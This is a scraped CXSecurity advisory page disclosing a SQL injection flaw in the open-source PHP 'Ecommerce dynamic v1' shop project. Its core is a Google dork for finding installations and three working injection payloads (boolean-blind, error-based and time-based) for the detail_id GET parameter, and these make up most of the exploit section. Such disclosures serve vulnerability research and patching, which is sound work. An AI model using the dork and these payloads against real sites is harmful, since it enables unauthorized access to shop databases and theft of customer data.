---
title: Ecommerce dynamic v1 - Sql Injection
url: https://cxsecurity.com/issue/WLB-2025010009
source: CXSECURITY Database RSS Feed - CXSecurity.com
date: 2025-01-08
fetch_date: 2025-10-06T20:04:56.558317
---

# Ecommerce dynamic v1 - Sql Injection

[![Home Page](https://cert.cx/cxstatic/images/12018/cxseci.png)](https://cxsecurity.com/)

* [Home](https://cxsecurity.com/)
* Bugtraq
  + [Full List](https://cxsecurity.com/wlb/)
  + [Only Bugs](https://cxsecurity.com/bugs/)
  + [Only Tricks](https://cxsecurity.com/tricks/)
  + [Only Exploits](https://cxsecurity.com/exploit/)
  + [Only Dorks](https://cxsecurity.com/dorks/)
  + [Only CVE](https://cxsecurity.com/cvelist/)
  + [Only CWE](https://cxsecurity.com/cwelist/)
  + [Fake Notes](https://cxsecurity.com/bogus/)
  + [Ranking](https://cxsecurity.com/best/1/)
* CVEMAP
  + [Full List](https://cxsecurity.com/cvemap/)
  + [Show Vendors](https://cxsecurity.com/cvevendors/)
  + [Show Products](https://cxsecurity.com/cveproducts/)
  + [CWE Dictionary](https://cxsecurity.com/allcwe/)
  + [Check CVE Id](https://cxsecurity.com/cve/)
  + [Check CWE Id](https://cxsecurity.com/cwe/)
* Search
  + [Bugtraq](https://cxsecurity.com/search/)
  + [CVEMAP](https://cxsecurity.com/search/cve/)
  + [By author](https://cxsecurity.com/search/author/)
  + [CVE Id](https://cxsecurity.com/cve/)
  + [CWE Id](https://cxsecurity.com/cwe/)
  + [By vendors](https://cxsecurity.com/cvevendors/)
  + [By products](https://cxsecurity.com/cveproducts/)
* RSS
  + [Bugtraq](https://cxsecurity.com/wlb/rss/all/)
  + [CVEMAP](https://cxsecurity.com/cverss/fullmap/)
  + [CVE Products](https://cxsecurity.com/cveproducts/)
  + [Bugs](https://cxsecurity.com/wlb/rss/vulnerabilities/)
  + [Exploits](https://cxsecurity.com/wlb/rss/exploit/)
  + [Dorks](https://cxsecurity.com/wlb/rss/dorks/)
* More
  + [cIFrex](http://cifrex.org/)
  + [Facebook](https://www.facebook.com/cxsec)
  + [Twitter](https://twitter.com/cxsecurity)
  + [Donate](https://cxsecurity.com/donate/)
  + [About](https://cxsecurity.com/wlb/about/)

* [Submit](https://cxsecurity.com/wlb/add/)

|  |  |  |  |
| --- | --- | --- | --- |
|  |  | |  | | --- | | **Ecommerce dynamic v1 - Sql Injection** **2025.01.07**  **![ae](https://cert.cx/cxstatic/images/flags/ae.png) [Razi](https://cxsecurity.com/author/Razi/1/) **(AE)** ![ae](https://cert.cx/cxstatic/images/flags/ae.png)**  Risk: **Medium**  Local: **No**  Remote: ****Yes****  CVE: **N/A**  CWE: **N/A**  **[**Dork:** intext:"Ecommerce-dynamic-website"](https://cxsecurity.com/dorks/)** | |

# Exploit Title: Ecommerce dynamic v1 - Sql Injection
# Google Dork: intext:"Ecommerce-dynamic-website"
# Date: 2024-12-28
# Exploit Author: Parastou Razi
# Contact: razi.parastoo@gmail.com
# Tested On: Windows, Firefox
# Github Link: https://github.com/Pratikginoya/Ecommerce-dynamic-website-with-admin-panel-using-php
# Version: 1
# Tested on: Windows 10 x64
Proof of Concept:
1. Description:
A SQL injection vulnerability exists in Ecommerce dynamic Open Source System v1 via the "detail\_id" parameters in GET request sent to php.
2. Proof
Parameter: detail\_id (GET)
Type: boolean-based blind
Payload: detail\_id=5' AND 3583=3583 AND 'parastou'='parastou
Type: error-based
Payload: detail\_id=5' AND (SELECT 7540 FROM(SELECT COUNT(\*),CONCAT(0x716a767671,(SELECT (ELT(7540=7540,1))),0x7178787a71,FLOOR(RAND(0)\*2))x FROM INFORMATION\_SCHEMA.PLUGINS GROUP BY x)a) AND 'parastou'='parastou
Type: time-based blind
Payload: detail\_id=5' AND (SELECT 1035 FROM (SELECT(SLEEP(5)))VAUv) AND 'parastou'='parastou

[**See this note in RAW Version**](https://cxsecurity.com/ascii/WLB-2025010009)

[Tweet](https://twitter.com/share)

Vote for this issue:
 0
 0

50%

50%

#### **Thanks for you vote!**

#### **Thanks for you comment!** Your message is in quarantine 48 hours.

Comment it here.

Nick (\*)

Email (\*)

Video

Text (\*)

(\*) - required fields.
Cancel
Submit

|  |  |
| --- | --- |
|  | **{{ x.nick }}** ![]() | Date: {{ x.ux \* 1000 | date:'yyyy-MM-dd' }} *{{ x.ux \* 1000 | date:'HH:mm' }}* CET+1  ---   {{ x.comment }} |

Show all comments

---

Copyright **2025**, cxsecurity.com

|  |

Back to Top